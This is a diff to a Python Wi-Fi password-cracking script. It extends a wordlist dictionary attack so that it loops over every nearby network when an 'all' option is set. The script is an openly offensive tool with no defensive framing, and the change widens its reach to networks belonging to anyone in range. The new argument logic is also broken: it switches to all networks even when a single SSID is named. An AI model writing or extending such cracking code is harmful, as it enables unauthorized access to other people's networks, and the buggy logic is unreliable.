@@ -90,18 +90,27 @@ def crack_password(ssid, password, number, verbose=False):
 def crack_loop(ssid, file, verbose=False):
     print(YELLOW)
     print(TILDE, "Cracking...")
-    number = 0
-    with open(file, 'r', encoding='utf8') as words:
-        for line in words:
-            number += 1
-            line = line.split("\n")
-            pwd = line[0]
-            print(GREEN)
-            print(f"[{number}] Trying {ssid} with {pwd}")
-            crack_password(ssid, pwd, number, verbose=False)
+
+    if ssid == "*ALL*":
+        ssids = [network.ssid for network in wifi.networks]
+    else:
+        ssids = [ssid]
+
+    for ssid in ssids:
+        # ssid = network.ssid
+
+        number = 0
+        with open(file, 'r', encoding='utf8') as words:
+            for line in words:
+                number += 1
+                line = line.split("\n")
+                pwd = line[0]
+                print(GREEN)
+                print(f"[{number}] Trying {ssid} with {pwd}")
+                crack_password(ssid, pwd, number, verbose=False)
 
 
-def menu(client_ssid, path_to_file):
+def menu():
     parser = get_argument_parser()
     args = parser.parse_args()
 
@@ -111,7 +120,14 @@ def menu(client_ssid, path_to_file):
     ssid = args.ssid
     filee = args.file
     verbose = args.verbose
+    all = args.all
 
+    if not any((ssid, all)):
+        print(RED, MINUS, "one of ssid/all must be specified")
+        exit()
+    else:
+        print(YELLOW, PLUS, "setting lopp for all networks")
+        ssid = "*ALL*"
     # breaking
     if os.path.exists(filee):
         # pass
@@ -129,7 +145,7 @@ def menu(client_ssid, path_to_file):
 
 if __name__ == '__main__':
     # Main function call
-    ssid, filee, verbose = menu(client_ssid="", path_to_file="")
+    ssid, filee, verbose = menu()
     wifi = helpers.wifi.Wifi(verbose)
     crack_loop(ssid, filee, verbose)
 
